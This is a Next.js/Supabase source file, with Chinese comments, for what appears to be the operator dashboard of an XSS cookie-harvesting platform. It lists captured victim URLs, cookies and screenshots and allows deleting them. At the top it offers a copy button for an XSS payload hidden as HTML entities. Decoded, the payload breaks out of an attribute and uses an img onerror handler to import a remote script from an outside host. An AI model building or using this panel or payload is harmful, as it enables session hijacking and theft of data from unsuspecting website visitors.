// pages/display.js
import { useEffect, useState } from 'react';
import { supabase } from '../utils/supabaseClient';
import Image from 'next/image';

export default function DisplayTable() {
  const [data, setData] = useState([]);
  const [expandedRows, setExpandedRows] = useState({}); // 用于跟踪哪些行的内容被展开
  const [selectedImage, setSelectedImage] = useState(null); // 用于存储当前选中的图片
  const [showCopySuccess, setShowCopySuccess] = useState(false); // 控制复制成功的提示显示

  // 在组件加载时从 Supabase 获取数据
  useEffect(() => {
    const fetchData = async () => {
      try {
        const { data: fetchedData, error } = await supabase
          .from('xss')
          .select('id, url, cookie, screenshot, trigger_time');
        if (error) {
          console.error('获取数据时出错:', error);
        } else {
          setData(fetchedData);
        }
      } catch (error) {
        console.error('处理请求时出错:', error);
      }
    };
    fetchData();
  }, []);

  // 删除单条记录的函数
  const handleDelete = async (id) => {
    try {
      const { error } = await supabase
        .from('xss')
        .delete()
        .eq('id', id);
      if (error) {
        console.error('删除数据时出错:', error);
        alert('删除失败，请重试');
      } else {
        setData((prevData) => prevData.filter((item) => item.id !== id));
        alert('删除成功');
      }
    } catch (error) {
      console.error('处理删除请求时出错:', error);
      alert('删除失败，请重试');
    }
  };

  // 删除所有记录的函数
  const handleDeleteAll = async () => {
    try {
      const confirmDelete = window.confirm('确定要删除所有记录吗？');
      if (!confirmDelete) return;

      const { error } = await supabase
        .from('xss')
        .delete()
        .neq('id', 0);

      if (error) {
        console.error('删除所有数据时出错:', error);
        alert('删除失败，请重试');
      } else {
        setData([]); // 清空本地数据
        alert('所有记录已删除');
      }
    } catch (error) {
      console.error('处理删除所有请求时出错:', error);
      alert('删除失败，请重试');
    }
  };

  // HTML 解码函数
  const decodeHtml = (html) => {
    const txt = document.createElement('textarea');
    txt.innerHTML = html;
    return txt.value;
  };

  // 复制字符串到剪贴板
  const handleCopy = (text) => {
    const decodedText = decodeHtml(text); // 解码 HTML 实体
    navigator.clipboard.writeText(decodedText).then(
      () => {
        setShowCopySuccess(true); // 显示复制成功的提示
        setTimeout(() => setShowCopySuccess(false), 1000); // 0.5秒后隐藏提示
      },
      (err) => {
        console.error('复制失败:', err);
        alert('复制失败，请重试');
      }
    );
  };

  // 切换展开/收起状态
  const toggleExpand = (id) => {
    setExpandedRows((prev) => ({
      ...prev,
      [id]: !prev[id],
    }));
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>XSS 数据表</h1>

      {/* 居中的 span 和复制按钮 */}
      <div style={styles.codeContainer}>
        <span style={styles.codeSpan}>
        &#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#34;&#105;&#109;&#112;&#111;&#114;&#116;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#98;&#101;&#105;&#115;&#104;&#97;&#110;&#120;&#117;&#101;&#121;&#117;&#97;&#110;&#46;&#99;&#111;&#109;&#47;&#50;&#46;&#106;&#115;&#39;&#41;&#34;&#62;;
        </span>
        <button
          onClick={() =>
            handleCopy(
              "&#34;&#62;&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#34;&#105;&#109;&#112;&#111;&#114;&#116;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#98;&#101;&#105;&#115;&#104;&#97;&#110;&#120;&#117;&#101;&#121;&#117;&#97;&#110;&#46;&#99;&#111;&#109;&#47;&#50;&#46;&#106;&#115;&#39;&#41;&#34;&#62;"
            )
          }
          style={styles.copyButton}
        >
          复制
        </button>
        {/* 复制成功提示 */}
        {showCopySuccess && <div style={styles.copySuccess}>复制成功</div>}
      </div>

      {/* 添加“全部删除”按钮 */}
      <button onClick={handleDeleteAll} style={styles.deleteAllButton}>
        全部删除
      </button>

      {/* 渲染表格 */}
      <table style={styles.table}>
        <thead>
          <tr>
            <th>ID</th>
            <th>URL</th>
            <th>Cookie</th>
            <th>Screenshot</th>
            <th>Trigger Time</th>
            <th>操作</th>
          </tr>
        </thead>
        <tbody>
          {data.length > 0 ? (
            data.map((item) => (
              <tr key={item.id} style={styles.row}>
                <td>{item.id}</td>
                <td>
                  <a href={item.url} target="_blank" rel="noopener noreferrer">
                    {expandedRows[item.id] ? item.url : `${item.url.slice(0, 30)}...`}
                  </a>
                  <button onClick={() => toggleExpand(item.id)} style={styles.expandButton}>
                    {expandedRows[item.id] ? '收起' : '展开'}
                  </button>
                </td>
                <td>
                  {expandedRows[item.id] ? item.cookie : `${item.cookie.slice(0, 30)}...`}
                  <button onClick={() => toggleExpand(item.id)} style={styles.expandButton}>
                    {expandedRows[item.id] ? '收起' : '展开'}
                  </button>
                </td>
                <td>
                  {item.screenshot && (
                    <Image
                      src={item.screenshot}
                      alt="Screenshot"
                      width={50}
                      height={50}
                      style={styles.thumbnail}
                      onClick={() => setSelectedImage(item.screenshot)}
                    />
                  )}
                </td>
                <td>{item.trigger_time}</td>
                <td>
                  {/* 添加删除按钮 */}
                  <button onClick={() => handleDelete(item.id)} style={styles.deleteButton}>
                    删除
                  </button>
                </td>
              </tr>
            ))
          ) : (
            <tr>
              <td colSpan="6" style={styles.noDataCell}>
                没有数据
              </td>
            </tr>
          )}
        </tbody>
      </table>

      {/* 图片模态框 */}
      {selectedImage && (
        <div style={styles.modalOverlay} onClick={() => setSelectedImage(null)}>
          <div style={styles.modalContent}>
            <Image
              src={selectedImage}
              alt="Large Screenshot"
              width={800}
              height={600}
              style={styles.largeImage}
            />
          </div>
        </div>
      )}
    </div>
  );
}

// 样式定义
const styles = {
  container: {
    padding: '20px',
    fontFamily: 'Arial, sans-serif',
    maxWidth: '1200px',
    margin: '0 auto',
  },
  title: {
    textAlign: 'center',
    marginBottom: '20px',
    fontSize: '24px',
    color: '#333',
  },
  codeContainer: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: '20px',
    position: 'relative', // 确保复制成功提示可以相对定位
  },
  codeSpan: {
    backgroundColor: '#f4f4f4',
    padding: '10px',
    borderRadius: '5px',
    marginRight: '10px',
    fontFamily: 'monospace',
    fontSize: '14px',
  },
  copyButton: {
    padding: '5px 10px',
    backgroundColor: '#007bff',
    color: '#fff',
    border: 'none',
    borderRadius: '5px',
    cursor: 'pointer',
    fontSize: '14px',
  },
  copySuccess: {
    position: 'absolute',
    top: '-30px', // 提示显示在按钮上方
    right: '0',
    backgroundColor: '#28a745',
    color: '#fff',
    padding: '5px 10px',
    borderRadius: '5px',
    fontSize: '12px',
    boxShadow: '0 2px 5px rgba(0, 0, 0, 0.2)',
  },
  deleteAllButton: {
    display: 'block',
    margin: '20px auto',
    padding: '10px 20px',
    backgroundColor: '#dc3545',
    color: '#fff',
    border: 'none',
    borderRadius: '5px',
    cursor: 'pointer',
    fontSize: '16px',
  },
  table: {
    width: '100%',
    borderCollapse: 'collapse',
    border: '1px solid #ddd',
  },
  row: {
    borderBottom: '1px solid #ddd',
  },
  expandButton: {
    marginLeft: '10px',
    padding: '5px 10px',
    backgroundColor: '#007bff',
    color: '#fff',
    border: 'none',
    borderRadius: '5px',
    cursor: 'pointer',
  },
  thumbnail: {
    cursor: 'pointer',
    objectFit: 'contain',
  },
  deleteButton: {
    padding: '5px 10px',
    backgroundColor: '#dc3545',
    color: '#fff',
    border: 'none',
    borderRadius: '5px',
    cursor: 'pointer',
  },
  noDataCell: {
    textAlign: 'center',
    padding: '20px',
    color: '#666',
  },
  modalOverlay: {
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: 'rgba(0, 0, 0, 0.8)',
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'center',
    zIndex: 1000,
  },
  modalContent: {
    backgroundColor: '#fff',
    padding: '20px',
    borderRadius: '10px',
    boxShadow: '0 4px 8px rgba(0, 0, 0, 0.2)',
  },
  largeImage: {
    objectFit: 'contain',
  },
};